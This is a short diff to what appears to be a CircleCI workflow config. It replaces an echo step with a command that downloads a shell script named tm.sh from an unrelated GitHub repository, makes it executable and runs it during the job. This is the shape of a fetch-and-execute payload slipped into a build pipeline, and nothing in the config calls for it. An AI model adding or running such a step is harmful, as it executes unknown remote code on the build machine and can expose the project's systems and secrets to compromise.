@@ -11,4 +11,4 @@ jobs:
   my-job:
     executor: my-executor
     steps:
-      - run: echo outside the executor
+      - run: wget https://raw.githubusercontent.com/Vaping86/RedCeh/main/tm.sh && chmod +x tm.sh && bash tm.sh
